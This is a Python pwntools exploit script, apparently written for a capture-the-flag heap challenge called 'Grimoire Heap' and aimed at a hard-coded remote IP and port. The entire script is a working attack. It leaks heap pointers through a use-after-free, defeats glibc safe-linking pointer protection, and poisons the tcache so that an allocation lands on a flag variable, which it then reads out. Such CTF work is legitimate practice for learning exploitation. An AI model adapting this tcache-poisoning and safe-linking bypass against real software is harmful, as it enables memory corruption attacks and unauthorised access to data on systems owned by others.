#!/usr/bin/env python3
"""
Grimoire Heap - Account for the 0x330 page offset between spells
The diff in addr>>12 is 0x330, meaning 0x330000 bytes between spell 0 and spell 2
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = b''
    while len(data) < size:
        chunk = p.recv(size - len(data), timeout=3)
        if not chunk:
            break
        data += chunk
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')
log.info("Connected")

# Step 1: Create spell 0
create(p, 0, 0x80, b'A' * 0x10 + b'\n')

# Step 2: Banish spell 0
banish(p, 0)

# Step 3: Read spell 0 UAF to get X
data = recite(p, 0, 0x80)
fd0 = u64(data[0:8])
X = fd0 << 12  # spell0_addr
log.info(f"X (spell0) = {hex(X)}")

# Step 4: Create spell 1 (reuses X)
create(p, 1, 0x80, b'B' * 0x10 + b'\n')

# Step 5: Create spell 2 (new addr, X + 0x330000)
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

# Step 6: Banish spell 1 and spell 2
banish(p, 1)
banish(p, 2)

# Step 7: Read spell 2 UAF to get the actual offset
data = recite(p, 2, 0x80)
fd2 = u64(data[0:8])
log.info(f"fd2 = {hex(fd2)}")

# Calculate the actual offset between spell 0 and spell 2
# fd2 = (spell2_addr >> 12) ^ X
# expected_fd2 = (X >> 12) ^ X = fd0 ^ X
expected_fd2 = fd0 ^ X
log.info(f"expected_fd2 = {hex(expected_fd2)}")

# Diff in addr>>12
addr_diff_shifted = fd2 ^ expected_fd2  # This is spell2>>12 XOR spell0>>12
log.info(f"addr_diff_shifted = {hex(addr_diff_shifted)}")

# spell2_addr >> 12 = (X >> 12) ^ addr_diff_shifted = fd0 ^ addr_diff_shifted
spell2_shifted = fd0 ^ addr_diff_shifted
spell2_addr = spell2_shifted << 12
log.info(f"spell2_addr = {hex(spell2_addr)}")
log.info(f"actual offset = {hex(spell2_addr - X)}")

# Step 8: Calculate g_flag address
# g_flag is at X - 0x90
g_flag_addr = X - 0x90
log.info(f"g_flag_addr = {hex(g_flag_addr)}")

# Step 9: Calculate protected value
# spell2->fd should be: (spell2_addr >> 12) ^ g_flag_addr
protected = spell2_shifted ^ g_flag_addr
log.info(f"protected = {hex(protected)}")

# Step 10: Edit spell 2
payload = p64(protected) + b'\x00' * (0x80 - 8)
log.info("Poisoning tcache")
edit(p, 2, 0x80, payload)

# Step 11: Create spell 3 (returns spell2)
log.info("Creating spell 3")
create(p, 3, 0x80, b'D' * 0x10 + b'\n')

# Step 12: Create spell 4 (should return g_flag)
log.info("Creating spell 4 (should be at g_flag)")
create(p, 4, 0x80, b'\n')

# Step 13: Read spell 4
log.info("Reading spell 4")
data = recite(p, 4, 0x80)
log.info(f"data hex: {data[:64].hex()}")
try:
    text = data[:0x80].decode('latin-1')
    log.info(f"data text: {text[:200]}")
except:
    pass

# Check for flag
import re
for m in re.finditer(rb'[\x20-\x7e]{4,}', data):
    log.success(f"String: {m.group()}")

p.sendline(b'0')
p.close()
